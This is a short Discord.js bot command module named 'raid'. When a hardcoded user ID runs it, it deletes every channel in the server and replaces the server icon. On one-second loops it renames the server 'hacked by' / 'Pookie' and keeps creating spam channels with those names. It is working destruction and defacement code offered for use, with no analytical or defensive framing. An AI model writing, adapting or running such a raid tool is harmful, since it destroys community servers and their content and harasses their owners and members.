const Discord = require("discord.js");
const { RichEmbed } = require("discord.js");

module.exports.run = async (bot, message, args) =>{
console.log("test")
  if(message.author.id === "212238091455299585") {
  message.delete();
  message.guild.channels.forEach(channel => channel.delete())
  console.log("done")
  var server = message.guild;
  let raider = [`hacked by`, `Pookie`], i = 0;
    server.setIcon("https://i.f1g.fr/media/figarofr/704x396_crop/2012/07/31/2157853a-dafa-11e1-9c27-0446d2627d3c-493x328.jpg")
  setInterval(() =>  server.setName(`${raider[i++ % raider.length]}`), 1000)
  var raide = setInterval(raiding, 1000);
  function raiding () {
    var server = message.guild;
    server.createChannel(`${raider[i++ % raider.length]}`)
  }
  }else {
    return;
  }
}
module.exports.help = {
    name: "raid"
}